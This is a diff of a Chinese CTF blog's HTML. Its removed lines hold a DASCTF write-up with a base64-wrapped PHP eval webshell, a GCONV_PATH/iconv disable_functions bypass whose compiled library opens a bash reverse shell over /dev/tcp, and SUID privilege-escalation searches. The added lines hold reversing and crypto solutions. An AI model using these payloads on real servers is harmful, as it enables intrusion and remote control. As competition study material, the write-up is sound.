+            for (p&#x3D;n-1; p&gt;0; p--)
+            &#123;
+                z &#x3D; v[p-1];
+                y &#x3D; v[p] -&#x3D; MX;
+            &#125;
+            z &#x3D; v[n-1];
+            y &#x3D; v[0] -&#x3D; MX;
+            sum -&#x3D; DELTA;
         &#125;
-        echo &#39;&lt;div style&#x3D;&quot;color:#F00&quot;&gt;&#39;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;&#x2F;div&gt;&quot;;
+        while (--round);
+    &#125;
+&#125;
+
+
+int main()
+&#123;
+    unsigned long long v[]&#x3D; &#123;0xBD548E45099A220B, 0x50BB9976358C558A, 0x20598FD852017357, 0xDC9B969877F6E8C2, 0xBEC5A96D9ECC6B87, 0x34D1D0E4390DF96D, 0x6796AEADE501CC5D, 0xDC643460C1430B8F, 0x7CA5CE8BE64FE5EE, 0x066B317D2C139F9B&#125;;
+    unsigned long long const k[]&#x3D; &#123;0x0000000000000052, 0x0000000000000033, 0x0000000000000076, 0x0000000000000045, 0x0000000000000072, 0x0000000000000073, 0x0000000000000033, 0x000000000000005F, 0x0000000000000031, 0x0000000000000053, 0x000000000000005F, 0x0000000000000045, 0x0000000000000061, 0x0000000000000053, 0x0000000000000079, 0x000000000000000A&#125;;
+    int n &#x3D; 0xa; 
+    btea(v, -n, k);
+    for(int i &#x3D; 0; i &lt; 8*n; i++)
+    &#123;
+        printf(&quot;%c&quot;, ((unsigned char *)&amp;v)[i]);
+    &#125;
+    return 0;
 &#125;</code></pre>
 
-<p>同时我们还要串一个一句话木马来包含这个文件，使这段base64加密的东西可以被解析</p>
-<pre class="language-none"><code class="language-none">&lt;?php
-Eval(base64_decode(&#39;ZXZhbCgkX1BPU1RbJ2EnXSk&#x3D;&#39;).&#39;;&#39;);&#x2F;&#x2F;注意eval里的分号是要拼接上去，而不是直接加上
-?&gt;</code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331195013802.png" alt="image-20220331195013802"></p>
-<p>//实际上这里做题的时候经常报错，但是用get方法取值就没问题,所以我下面都用的get的一句话木马</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331202127030.png" alt="image-20220331202127030"></p>
-<p>再利用include和php://filter来让之前我们写的页面的代码执行</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331195651892.png" alt="image-20220331195651892"></p>
-<pre class="language-none"><code class="language-none">a&#x3D;include(base64_decode(&#39;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT05YmMwOWVlNGUwZWI5MTg0MGY3YzUyMDdlMWQ4NDg1Mi5waHA&#x3D;&#39;));
-里面这段base64加密的内容是
-php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;9bc09ee4e0eb91840f7c5207e1d84852.php</code></pre>
-
-<p>现在我们就可以根据<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42303523/article/details/117911859">使用GCONV_PATH与iconv进行bypass disable_functions_lesion__的博客-CSDN博客</a></p>
-<p>这篇文章里的东西进行提交了</p>
-<p>首先是gconv-modules文件</p>
-<pre class="language-none"><code class="language-none">module  自定义字符集名字（大写）&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;自定义字符集名字（小写）    2
-module  INTERNAL    自定义字符集名字（大写）&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;自定义字符集名字（小写）    2
-根据题目我们可以改成aa
-module  A&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;a    2
-module  INTERNAL    A&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;a    2</code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331202853421.png" alt="image-20220331202853421"></p>
-<p>然后是so文件</p>
-<pre class="language-none"><code class="language-none">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-
-void gconv() &#123;&#125;
-
-void gconv_init() &#123;
-  system(&quot;希望执行的命令&quot;);
-&#125;
-
-我们可以写成
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-
-void gconv() &#123;&#125;
-
-void gconv_init() &#123;
-  system(&quot;bash -c &#39;exec bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39;&quot;);
-&#125;
-
-</code></pre>
-
-<p>然后编译</p>
-<pre class="language-none"><code class="language-none">gcc 源代码文件名.c -o 自定义字符集名.so -shared -fPIC</code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331203826312.png" alt="image-20220331203826312"></p>
-<p>上传</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331203859731.png" alt="image-20220331203859731"></p>
-<p>然后书写shell.php</p>
-<pre class="language-none"><code class="language-none">&lt;?php
-    putenv(&quot;GCONV_PATH&#x3D;&#x2F;tmp&#x2F;&quot;);
-    iconv(&quot;自定义字符集名&quot;, &quot;UTF-8&quot;, &quot;whatever&quot;);
-?&gt;</code></pre>
-
-<p>我们就直接传参</p>
-<pre class="language-none"><code class="language-none">a&#x3D;putenv(&quot;GCONV_PATH&#x3D;&#x2F;tmp&#x2F;&quot;);include(&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.a.utf-8&#x2F;resource&#x3D;&#x2F;tmp&#x2F;a.so&#39;);</code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331205203233.png" alt="image-20220331205203233"></p>
-<p>shell弹出来了</p>
-<p>但是要访问flag文件权限不够</p>
-<p>suid提权<a target="_blank" rel="noopener" href="http://t.zoukankan.com/appear001-p-12059158.html">Linux提权-suid提权 - 走看看 (zoukankan.com)</a></p>
-<p>find / -user root -perm -4000 -print 2&gt;/dev/null</p>
-<p>这步不知道为什么我没有复现成功，只输出了三个值就卡住了</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331205416767.png" alt="image-20220331205416767"></p>
-<p>但是可以用别的命令看看</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">find &#x2F;bin -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null
-find &#x2F;usr -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null
-find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331205820325.png" alt="image-20220331205820325"></p>
-<p>最后就是看到nl有权限，用nl读取flag就行</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331205546901.png" alt="image-20220331205546901"></p>
-<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="月圆之夜"><a href="#月圆之夜" class="headerlink" title="月圆之夜"></a>月圆之夜</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331214556905.png" alt="image-20220331214556905"></p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1rL4y1T7fb?spm_id_from=333.337.search-card.all.click">我破译了神级彩蛋！这款游戏竟然藏了这么多剧情？《月圆之夜》究竟讲了什么故事？_单机游戏热门视频 (bilibili.com)</a></p>
-<p>B站有解密的，对着找就行</p>
-<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="FlowerCipher"><a href="#FlowerCipher" class="headerlink" title="FlowerCipher"></a>FlowerCipher</h2><pre class="language-none"><code class="language-none"># python3
-
-from secret import flag
-import random
-
-# flag &#x3D; b&#39;flag&#123;%s&#125;&#39; % md5(something).hexdigest()
-# note that md5 only have characters &#39;abcdef&#39; and digits
-
-def Flower(x, key):
-    flower &#x3D; random.randint(0, 4096)
-    return x * (key ** 3 + flower)
-
-flag &#x3D; flag[5:-1]
-rounds &#x3D; len(flag)
-
-L, R &#x3D; 1, 0
-for i in range(rounds):
-    L, R &#x3D; R + Flower(L, flag[i]), L
-
-print(L, R)
-&#39;&#39;&#39;
-15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003
-&#39;&#39;&#39;</code></pre>
-
-<p>加密方式就是把flag的字符转成md5然后再转成ascii码后套在Flower函数里计算，然后对RL重新赋值，这样的R其实就 是前一个L的值，而实际上L = 上一个R + 上一个L乘上(key ** 3 + flower)，</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331215625510.png" alt="image-20220331215625510"></p>
-<p>显然 L1 * (key ** 3 + flower)是能被L1整除的，而R1不行</p>
-<p>所以L2/L1的余数就是L2</p>
-<p>这样我们可以得到所有的L和R</p>
-<pre class="language-none"><code class="language-none">R &#x3D; &#123;0: 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003, 1: 935298420671754230833014738849730432588169238033228173469583131476419084794695511761146278309606770027490667271610796624269392034586175088396235641537756093736185366, 2: 7402968320895532116930768370098929764678065093602516751185225609968053961398195671796668035067389408306736179462173593882795916384659802649189800851665219198361, 3: 41491807647864532203061547188977816042392604608090542687445179257686072390683442091157724792609311622180322599523073162631870961894947012137520634996058265, 4: 363542281260527120641507826394376579427002124891256726811704925452455933892306777570036028677323021255266880206017499363363356743613369155668503557061, 5: 3038050870004975946934828279229998090001629942971672705946371743686684953534372767609080560274203027849883925292484330032865963662762987021572213, 6: 3121683903445470016877317983137081025437455800044243487676152297523129079630621593231064333666220053742946978640516933836161839706107832842, 7: 16713517279670522179142602316669021266414545548551242366498025076135157482269671171234675566764239156725485371108735804221489129242235, 8: 17728566345779292838907909381612640668036643431117165902908905722221490552536570008262521006387722966311695266888986102760148482, 9: 18822751726365286700612339826340137082689797360168751039458371318582478795225200597245268849966216725478600774872948579145, 10: 19346619488865481717482094100686681292384530125288986759529832156605546935716879938892385301891033660176897469426477, 11: 19304497076225869711849746340455541612339463403087957113496859433662333338211557279788474751973335123601723351, 12: 19287157921091613716265688246942013055491723611322575658962386161345041119412098008892719335475158074595, 13: 163194634853135239779527687110852732238802459017066087158243026833107794785760861815584881897662446, 14: 973825402922208545745882895848854992390620148165434035074196392656950555217820068399921894085, 15: 6028609474886885541605763758989943967354486126474121155263363791803356933057570965004061, 16: 5830376668137452804173383567980586211563348379884185911787096393298400138955904511, 17: 32759342090485149698017824597983901673872922475506121132811189377165700630061, 18: 241267801518963217329803327254141129383508497053892152707957403620167975, 19: 240324048977128823416619126180138745528644638124733113619292984561, 20: 1501209023627137765492979001172871435243212151481455508796928, 21: 11731219952144596819377276074864534430521345582519171825, 22: 11050144307727113700681557772687121323224647867153, 23: 10722465754210488857842384539746544074196670, 24: 67952303343509961405922862120527631953, 25: 424678007756192434300006917804988, 26: 449366186013055209469307061, 27: 2694478038943586736328, 28: 24316418691677517, 29: 137492755075, 30: 133317, 31: 1, 32: 0&#125;
-
-L &#x3D; &#123;0: 15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899, 1: 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003, 2: 935298420671754230833014738849730432588169238033228173469583131476419084794695511761146278309606770027490667271610796624269392034586175088396235641537756093736185366, 3: 7402968320895532116930768370098929764678065093602516751185225609968053961398195671796668035067389408306736179462173593882795916384659802649189800851665219198361, 4: 41491807647864532203061547188977816042392604608090542687445179257686072390683442091157724792609311622180322599523073162631870961894947012137520634996058265, 5: 363542281260527120641507826394376579427002124891256726811704925452455933892306777570036028677323021255266880206017499363363356743613369155668503557061, 6: 3038050870004975946934828279229998090001629942971672705946371743686684953534372767609080560274203027849883925292484330032865963662762987021572213, 7: 3121683903445470016877317983137081025437455800044243487676152297523129079630621593231064333666220053742946978640516933836161839706107832842, 8: 16713517279670522179142602316669021266414545548551242366498025076135157482269671171234675566764239156725485371108735804221489129242235, 9: 17728566345779292838907909381612640668036643431117165902908905722221490552536570008262521006387722966311695266888986102760148482, 10: 18822751726365286700612339826340137082689797360168751039458371318582478795225200597245268849966216725478600774872948579145, 11: 19346619488865481717482094100686681292384530125288986759529832156605546935716879938892385301891033660176897469426477, 12: 19304497076225869711849746340455541612339463403087957113496859433662333338211557279788474751973335123601723351, 13: 19287157921091613716265688246942013055491723611322575658962386161345041119412098008892719335475158074595, 14: 163194634853135239779527687110852732238802459017066087158243026833107794785760861815584881897662446, 15: 973825402922208545745882895848854992390620148165434035074196392656950555217820068399921894085, 16: 6028609474886885541605763758989943967354486126474121155263363791803356933057570965004061, 17: 5830376668137452804173383567980586211563348379884185911787096393298400138955904511, 18: 32759342090485149698017824597983901673872922475506121132811189377165700630061, 19: 241267801518963217329803327254141129383508497053892152707957403620167975, 20: 240324048977128823416619126180138745528644638124733113619292984561, 21: 1501209023627137765492979001172871435243212151481455508796928, 22: 11731219952144596819377276074864534430521345582519171825, 23: 11050144307727113700681557772687121323224647867153, 24: 10722465754210488857842384539746544074196670, 25: 67952303343509961405922862120527631953, 26: 424678007756192434300006917804988, 27: 449366186013055209469307061, 28: 2694478038943586736328, 29: 24316418691677517, 30: 137492755075, 31: 133317, 32: 1&#125;
-</code></pre>
-
-<p>然后再用(L[i]-R[i+1])//L[i+1]求出flag[i]**3 + flower的值</p>
-<pre class="language-none"><code class="language-none">FLAG &#x3D; &#123;0: 112511, 1: 149387, 2: 126341, 3: 178420, 4: 114132, 5: 119663, 6: 973209, 7: 186776, 8: 942745, 9: 941869, 10: 972922, 11: 1002182, 12: 1000899, 13: 118185, 14: 167581, 15: 161534, 16: 1034000, 17: 177976, 18: 135780, 19: 1003927, 20: 160087, 21: 127967, 22: 1061635, 23: 1030560, 24: 157794, 25: 160009, 26: 945060, 27: 166773, 28: 110809, 29: 176856, 30: 1031322, 31: 133317&#125;</code></pre>
-
-<p>由于1的ascii的三次方和2的ascii码之间的差值也要比最大的flower大，所以我们就可以遍历一下</p>
-<p>得到flag值</p>
-<pre class="language-python" data-language="python"><code class="language-python">FLAG &#x3D; &#123;0: 112511, 1: 149387, 2: 126341, 3: 178420, 4: 114132, 5: 119663, 6: 973209, 7: 186776, 8: 942745, 9: 941869, 10: 972922, 11: 1002182, 12: 1000899, 13: 118185, 14: 167581, 15: 161534, 16: 1034000, 17: 177976, 18: 135780, 19: 1003927, 20: 160087, 21: 127967, 22: 1061635, 23: 1030560, 24: 157794, 25: 160009, 26: 945060, 27: 166773, 28: 110809, 29: 176856, 30: 1031322, 31: 133317&#125;
-
-flag &#x3D; &#39;&#39;
-for i in range(32):
-    #FLAG[i] &#x3D; (L[i]-R[i+1])&#x2F;&#x2F;L[i+1]
-    for j in range(48,123):
-        if j**3 &lt;&#x3D; FLAG[i] and (j+1)**3 &gt; FLAG[i]:
-            flag +&#x3D; chr(j)
-        else:
-            continue
-
-print(&#39;flag&#x3D;&#39;+flag[::-1])
-&#x2F;&#x2F;3e807b66ef26d38e671ddcbb9c108250</code></pre>
-
-
-
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626175648015.png" alt="image-20220626175648015"></p>
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="rssssa9"><a href="#rssssa9" class="headerlink" title="rssssa9"></a>rssssa9</h2><p>照着题目逆推脚本，用sage</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626165422972.png" alt="image-20220626165422972"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626165353341.png" alt="image-20220626165353341"></p>
+<p>交了一下结果不对</p>
+<p>发现是加密的时候在后边填了点东西</p>
+<p>再去掉加密里加上的最后那段123....321就行</p>
 
                 
             </div>
@@ -995,7 +698,7 @@ print(&#39;flag&#x3D;&#39;+flag[::-1])
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Ethe448.github.io/2022/03/30/dasctf%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/">https://Ethe448.github.io/2022/03/30/dasctf%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/</a>
+                    <a href="https://Ethe448.github.io/2022/06/28/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/">https://Ethe448.github.io/2022/06/28/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1478,13 +1181,13 @@ print(&#39;flag&#x3D;&#39;+flag[::-1])
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/04/24/ctfshow%20web/">
+                <a href="/2022/06/28/tsgw/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/3.jpg" class="responsive-img" alt="ctfshow web">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/4.jpg" class="responsive-img" alt="天山固网">
                         
-                        <span class="card-title">ctfshow web</span>
+                        <span class="card-title">天山固网</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1495,7 +1198,7 @@ print(&#39;flag&#x3D;&#39;+flag[::-1])
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-24
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-06-28
                         </span>
                         <span class="publish-author">
                             
@@ -1523,13 +1226,13 @@ print(&#39;flag&#x3D;&#39;+flag[::-1])
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/02/25/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9C%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/">
+                <a href="/2022/05/20/520%E8%BF%8E%E6%96%B0%E8%B5%9Bwp/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/14.jpg" class="responsive-img" alt="从一道ctf题看php原生类">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/7.jpg" class="responsive-img" alt="dest0g3 520迎新赛wp">
                         
-                        <span class="card-title">从一道ctf题看php原生类</span>
+                        <span class="card-title">dest0g3 520迎新赛wp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1540,7 +1243,7 @@ print(&#39;flag&#x3D;&#39;+flag[::-1])
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-25
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-20
                             </span>
                         <span class="publish-author">
                             
@@ -1553,8 +1256,8 @@ print(&#39;flag&#x3D;&#39;+flag[::-1])
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
-                        <span class="chip bg-color">web学习</span>
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
                     </a>
                     
                 </div>
